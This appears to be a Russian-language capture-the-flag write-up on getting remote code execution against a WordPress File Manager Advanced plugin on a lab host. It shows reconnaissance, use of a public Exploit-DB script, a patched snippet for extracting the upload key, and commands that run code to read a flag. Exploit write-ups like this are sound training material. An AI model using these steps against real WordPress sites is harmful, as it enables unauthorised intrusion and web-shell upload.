# Отчёт по задачам web-1-1 -- RCE на узле library.edu.stf

## Метаданные

| Поле | Значение |
|:-----|:---------|
| Задачи | web-1-1 (RCE) |
| Узел | library.edu.stf (10.124.1.233) |
| Категория | Web / Remote Code Execution |
| Уязвимости | CVE-2023-2068 (Unauth RCE) |
| MITRE ATT&CK | T1190, T1059, T1068 |
| Статус | Оба флага получены |

## Краткое описание

Цепочка атак начинается с уязвимого WordPress-плагина Advanced File Manager (версия 5.0), который позволяет получить RCE.

## Часть 1: RCE (web-1-1)

### Шаги воспроизведения

1. Разведка:

Сначала пробуем через `wpscan`

```bash
wpscan --url library.edu.stf
```

У меня он отказался работать, потому я перешел к ручному просмотру сайта:

На главной странице сайта в исходном коде обнаружена ссылка на плагин `/wp-content/plugins/file-manager-advanced/`.
Проверка readme.txt подтвердила версию 5.0.

Поэтому я решил поискать уязвимости и эксплойты по данному плагину:
```bash
searchsploit "File Manager Advanced"
```

Получаем:
```bash
------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                 |  Path
------------------------------------------------------------------------------- ---------------------------------
Advanced File Manager 3.4.1 - Denial of Service (PoC)                          | windows/dos/46284.py
File Manager Advanced Shortcode 2.3.2 - Unauthenticated Remote Code Execution  | php/webapps/51505.py
PHP Advanced Transfer Manager 1.10 - Arbitrary File Upload                     | php/webapps/11613.txt
PHP Advanced Transfer Manager 1.21 - Arbitrary File Inclusion                  | php/webapps/25686.txt
PHP Advanced Transfer Manager 1.21 - Arbitrary File Upload                     | php/remote/25627.txt
------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Копируем эксплойт:
```bash
searchsploit -m php/webapps/51505.py
```

2. Эксплуатация:
Использован публичный эксплойт на Python (Exploit-DB: 51505.py). Скрипт находит ключ _fmakey на странице /library/ и отправляет POST-запрос с параметром upload_allow=text/x-php, загружая шелл shell.php.

Но скрипт падал не в состоянии найти `_fmakey`:
```bash
python3 51505.py -u http://library.edu.stf/
```

Поэтому пришлось чутка поправить скрипт(либо пришлось бы хардкодить ключ):
```python
try:
    r = requests.get(target_url, timeout=10)
    # Гибкая регулярка: ищет и 'fmakey': '...', и "fmakey":"..."
    match = re.search(r"['\"]?_fmakey['\"]?\s*:\s*['\"]([a-zA-Z0-9]+)['\"]", r.text)
    
    if match:
        fmakey = match.group(1)
        print(f"{SUCCESS} Found fmakey: {fmakey}")
    else:
        print(f"{FAIL} Cannot find fmakey in page source. Check URL or page format.")
        sys.exit(1)
```

Проверяем

```bash
python3 51505.py library.edu.stf "whoami"
# Результат: www-data
```

3. Захват флага:
```bash
python3 51505.py library.edu.stf "sh -c /home/rceflag"
# Флаг: 91130381-3887-49d7-98f7-9bf743ce8d77
```

